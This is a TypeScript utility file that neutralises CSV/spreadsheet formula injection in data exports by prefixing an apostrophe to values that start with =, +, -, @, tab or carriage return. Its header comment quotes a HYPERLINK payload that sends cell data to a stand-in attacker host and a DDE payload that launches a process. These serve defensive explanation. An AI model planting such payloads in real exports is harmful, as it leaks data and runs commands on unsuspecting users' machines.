/**
 * P1.10 (§34) — CSV / SPREADSHEET FORMULA INJECTION.
 *
 * WHAT WAS WRONG
 * --------------
 * `src/utils/exportUtils.ts` escaped a double quote by doubling it and wrapped every field in
 * quotes. That is correct CSV *quoting*, and it is not protection: Excel and Google Sheets
 * strip the quotes on import and then evaluate a cell whose first character is `=`, `+`, `-`,
 * `@`, tab or carriage return.
 *
 * These exports carry contact names, company names, email subjects and reply bodies, all
 * supplied by external parties. A prospect can put
 *
 *     =HYPERLINK("https://evil.example/"&A1,"Click for pricing")
 *
 * in their display name, and it executes on the operator's machine the moment they open the
 * export. DDE payloads (`=cmd|' /C calc'!A0`) go further and can launch a process, with a
 * warning dialog most people click through.
 *
 * THE FIX
 * -------
 * Prefix a dangerous leading character with an apostrophe. Spreadsheets treat such a cell as
 * literal text and do not display the apostrophe, so the export still reads correctly.
 *
 * ONE IMPLEMENTATION, IN shared/
 * ------------------------------
 * This lives in `shared/` because both sides export data: the browser writes the CSV the
 * operator downloads, and the server has export paths of its own. Two copies of a rule like
 * this is how one of them quietly stops matching the other — the same reason the email
 * normalisation is a single shared module.
 */

/** Characters that make a spreadsheet treat the cell as a formula rather than as text. */
const FORMULA_LEADERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralise a value's leading character. Does NOT quote — see `csvField` for that.
 */
export function neutralizeCsvValue(value: unknown): string {
  const text = value === null || value === undefined ? '' : String(value);
  if (text.length === 0) return text;
  return FORMULA_LEADERS.includes(text[0]) ? `'${text}` : text;
}

/**
 * A complete CSV field: neutralised, then quoted.
 *
 * Order matters. Neutralising AFTER quoting would put the apostrophe outside the quotes, where
 * the spreadsheet never sees it.
 *
 * `alwaysQuote` matches the browser exporter's existing output, which quotes every field.
 * Without it, quoting is applied only when the content requires it.
 */
export function csvField(value: unknown, options: { alwaysQuote?: boolean } = {}): string {
  const neutralised = neutralizeCsvValue(value);

  if (options.alwaysQuote) {
    return `"${neutralised.replace(/"/g, '""')}"`;
  }
  if (/[",\n\r]/.test(neutralised)) {
    return `"${neutralised.replace(/"/g, '""')}"`;
  }
  return neutralised;
}

/** A row of fields, joined. */
export function csvRow(values: readonly unknown[], options: { alwaysQuote?: boolean } = {}): string {
  return values.map((v) => csvField(v, options)).join(',');
}
